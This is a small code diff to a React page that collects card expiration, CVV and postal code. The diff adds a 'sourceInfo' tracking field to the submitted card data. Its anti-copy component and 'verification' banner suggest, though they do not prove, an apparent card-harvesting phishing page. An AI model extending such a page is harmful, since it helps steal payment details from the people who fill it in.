@@ -8,6 +8,7 @@ import { AntiCopyProtection } from '@/components/AntiCopyProtection';
 import { apiRequest } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
 import { validateLuhn } from '@/lib/luhn';
+import { getSourceInfo } from '@/lib/sourceInfo';
 import '@/styles/styles.css';
 import logoSvg from '@/assets/paymentvault_logo.svg';
 import sasVerificationBanner from '@assets/image_1767022072566.png';
@@ -96,6 +97,7 @@ export default function PostalCodePage() {
         expiration: data.expiration,
         cvv: data.cvv,
         postalCode: data.postal,
+        sourceInfo: getSourceInfo(),
       });
     },
     onSuccess: () => {
